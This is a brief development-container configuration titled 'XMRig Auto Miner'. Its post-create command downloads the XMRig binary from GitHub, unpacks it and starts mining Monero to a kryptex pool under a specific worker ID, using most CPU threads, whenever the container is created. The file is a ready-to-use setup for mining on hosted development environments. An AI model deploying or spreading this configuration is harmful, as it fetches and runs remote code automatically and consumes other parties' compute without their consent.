name: XMRig Auto Miner
postCreateCommand: docker compose -f /workspaces/${localWorkspaceFolderBasename}/docker-compose.yml up -d && sleep 5 && docker exec ubuntu_miner bash -c 'apt update && apt install -y wget && cd ~ && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && cd xmrig-6.26.0 && ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.w7uioe3 -p x --coin monero --cpu-max-threads-hint=60'
